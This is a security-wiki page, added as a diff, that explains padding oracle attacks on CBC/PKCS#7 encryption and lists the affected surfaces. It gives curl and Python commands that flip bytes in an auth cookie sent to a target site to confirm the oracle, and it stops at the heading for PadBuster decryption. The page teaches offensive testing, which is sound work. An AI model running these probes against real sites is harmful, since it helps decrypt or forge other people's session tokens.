@@ -1,0 +1,1888 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Padding Oracle Attacks # A Padding Oracle Attack is a chosen-ciphertext attack that allows an attacker to decrypt — and even re-encrypt — arbitrary ciphertext without knowing the encryption key. It works against block ciphers running in CBC mode with PKCS#7 padding by exploiting a single information leak: whether the padding of a submitted ciphertext is valid or not.
+The &ldquo;oracle&rdquo; is any application behavior that distinguishes valid padding from invalid padding — an error message, a different HTTP status code, a response-size delta, or a timing difference.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Padding Oracle Attacks" />
+<meta property="og:description" content="Padding Oracle Attacks # A Padding Oracle Attack is a chosen-ciphertext attack that allows an attacker to decrypt — and even re-encrypt — arbitrary ciphertext without knowing the encryption key. It works against block ciphers running in CBC mode with PKCS#7 padding by exploiting a single information leak: whether the padding of a submitted ciphertext is valid or not.
+The &ldquo;oracle&rdquo; is any application behavior that distinguishes valid padding from invalid padding — an error message, a different HTTP status code, a response-size delta, or a timing difference." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>Padding Oracle Attacks | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class="">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class=" active">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Padding Oracle Attacks</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#padding-oracle-attacks">Padding Oracle Attacks</a>
+      <ul>
+        <li><a href="#understanding-the-basics">Understanding the Basics</a>
+          <ul>
+            <li><a href="#cbc-mode--pkcs7-padding">CBC Mode &amp; PKCS#7 Padding</a></li>
+            <li><a href="#the-oracle-signal-types">The Oracle Signal Types</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surface">Attack Surface</a></li>
+        <li><a href="#exploiting-padding-oracle-attacks">Exploiting Padding Oracle Attacks</a>
+          <ul>
+            <li><a href="#1-identifying-the-oracle">1. Identifying the Oracle</a></li>
+            <li><a href="#2-decrypting-ciphertext-with-padbuster">2. Decrypting Ciphertext with PadBuster</a></li>
+            <li><a href="#3-privilege-escalation-via-cbc-r-forging-arbitrary-plaintext">3. Privilege Escalation via CBC-R (Forging Arbitrary Plaintext)</a></li>
+            <li><a href="#4-aspnet-viewstate--webresourceaxd-cve-2010-3332">4. ASP.NET ViewState / WebResource.axd (CVE-2010-3332)</a></li>
+            <li><a href="#5-apache-shiro-rememberme-cookie-cbc-aes-128">5. Apache Shiro &ldquo;RememberMe&rdquo; Cookie (CBC AES-128)</a></li>
+            <li><a href="#6-timing-based-oracle-lucky-thirteen--blind">6. Timing-Based Oracle (Lucky Thirteen / Blind)</a></li>
+            <li><a href="#test-cases">Test Cases</a></li>
+          </ul>
+        </li>
+        <li><a href="#detection-techniques-offensive-perspective">Detection Techniques (Offensive Perspective)</a>
+          <ul>
+            <li><a href="#manual-detection--confirming-the-oracle">Manual Detection — Confirming the Oracle</a></li>
+            <li><a href="#automated-detection">Automated Detection</a></li>
+          </ul>
+        </li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#mitigation--prevention">Mitigation &amp; Prevention</a></li>
+        <li><a href="#good-to-read">Good To Read</a>
+          <ul>
+            <li><a href="#notable-cves--incidents">Notable CVEs &amp; Incidents</a></li>
+            <li><a href="#hackerone-reports">HackerOne Reports</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="padding-oracle-attacks">
+  Padding Oracle Attacks
+  <a class="anchor" href="#padding-oracle-attacks">#</a>
+</h1>
+<p>A Padding Oracle Attack is a chosen-ciphertext attack that allows an attacker to decrypt — and even re-encrypt — arbitrary ciphertext without knowing the encryption key. It works against block ciphers running in CBC mode with PKCS#7 padding by exploiting a single information leak: whether the padding of a submitted ciphertext is valid or not.</p>
+<p>The &ldquo;oracle&rdquo; is any application behavior that distinguishes valid padding from invalid padding — an error message, a different HTTP status code, a response-size delta, or a timing difference. Max cost to recover one byte: 256 requests.</p>
+<h2 id="understanding-the-basics">
+  Understanding the Basics
+  <a class="anchor" href="#understanding-the-basics">#</a>
+</h2>
+<h3 id="cbc-mode--pkcs7-padding">
+  CBC Mode &amp; PKCS#7 Padding
+  <a class="anchor" href="#cbc-mode--pkcs7-padding">#</a>
+</h3>
+<p>In CBC decryption, each plaintext block is derived by decrypting the ciphertext block then XORing with the <strong>previous</strong> ciphertext block (or IV for block 1):</p>
+<pre tabindex="0"><code>P[n] = Decrypt(C[n]) XOR C[n-1]
+</code></pre><p>PKCS#7 padding fills the last block to the block boundary by repeating the number of padding bytes:</p>
+<pre tabindex="0"><code>1 byte  short: ...XX \x01
+2 bytes short: ...XX \x02\x02
+3 bytes short: ...XX \x03\x03\x03
+Full block:    \x10 * 16  (entire extra block of padding)
+</code></pre><p>If the decrypted last block does not end with valid PKCS#7 — the application signals an error. That signal is the oracle.</p>
+<h3 id="the-oracle-signal-types">
+  The Oracle Signal Types
+  <a class="anchor" href="#the-oracle-signal-types">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Signal Type</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Explicit error message</td>
+<td><code>&quot;Invalid padding&quot;</code>, <code>&quot;Decryption failed&quot;</code>, <code>&quot;Bad data&quot;</code></td>
+</tr>
+<tr>
+<td>HTTP status difference</td>
+<td><code>200 OK</code> (valid padding) vs <code>500 Internal Server Error</code> (invalid)</td>
+</tr>
+<tr>
+<td>Response body/length delta</td>
+<td>Different page content or length on padding error</td>
+</tr>
+<tr>
+<td>Redirect difference</td>
+<td>Redirect to login vs stay on page</td>
+</tr>
+<tr>
+<td>Timing side-channel</td>
+<td>Valid padding processes faster or slower than invalid</td>
+</tr>
+</tbody>
+</table>
+<h2 id="attack-surface">
+  Attack Surface
+  <a class="anchor" href="#attack-surface">#</a>
+</h2>
+<ul>
+<li><strong>Encrypted session cookies</strong> — CBC-encrypted auth tokens sent back to the server for decryption</li>
+<li><strong>ASP.NET ViewState / WebResource.axd</strong> — CBC-encrypted ViewState leaks padding validity via HTTP 500 vs 200 (CVE-2010-3332)</li>
+<li><strong>&ldquo;Remember Me&rdquo; cookies</strong> — Long-lived encrypted tokens decrypted server-side (Apache Shiro — CBC AES-128)</li>
+<li><strong>Encrypted URL parameters / query strings</strong> — Token passed as <code>?data=&lt;ciphertext&gt;</code> decrypted on each request</li>
+<li><strong>Encrypted form fields</strong> — Hidden fields containing server-encrypted state</li>
+<li><strong>API tokens &amp; JWT with CBC encryption</strong> — Non-standard JWTs using AES-CBC instead of AEAD</li>
+<li><strong>VPN / TLS with CBC ciphersuites</strong> — POODLE (SSL 3.0), Lucky Thirteen (TLS 1.0–1.2)</li>
+</ul>
+<h2 id="exploiting-padding-oracle-attacks">
+  Exploiting Padding Oracle Attacks
+  <a class="anchor" href="#exploiting-padding-oracle-attacks">#</a>
+</h2>
+<h3 id="1-identifying-the-oracle">
+  1. Identifying the Oracle
+  <a class="anchor" href="#1-identifying-the-oracle">#</a>
+</h3>
+<p>Before exploiting, confirm the oracle exists. Intercept a request carrying an encrypted value, flip a single byte in the last block, and observe the response differential.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Step 1 — Capture baseline (valid ciphertext)</span>
+</span></span><span style="display:flex;"><span>curl -s -o baseline.html -w <span style="color:#e6db74">&#34;%{http_code}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -b <span style="color:#e6db74">&#34;auth=RVJDQrwUdTRWJUVUeBKkEA==&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  https://target.com/dashboard
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2 — Flip last byte of ciphertext (Base64 decode → modify → re-encode)</span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import base64
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ct = base64.b64decode(&#39;RVJDQrwUdTRWJUVUeBKkEA==&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ct = bytearray(ct)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ct[-1] ^= 0x01           # flip last byte
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print(base64.b64encode(bytes(ct)).decode())
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → modified token</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 3 — Submit modified token</span>
+</span></span><span style="display:flex;"><span>curl -s -o modified.html -w <span style="color:#e6db74">&#34;%{http_code}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -b <span style="color:#e6db74">&#34;auth=&lt;modified_token&gt;&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  https://target.com/dashboard
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Compare: different status code or body = oracle confirmed</span>
+</span></span><span style="display:flex;"><span>diff baseline.html modified.html
+</span></span></code></pre></div><p>Oracle confirmed if:</p>
+<pre tabindex="0"><code>Valid ciphertext   → HTTP 200 / redirect to dashboard
+Modified ciphertext → HTTP 500 &#34;Invalid padding&#34; / redirect to error
+</code></pre><h3 id="2-decrypting-ciphertext-with-padbuster">
+  2. Decrypting Ciphertext with PadBuster
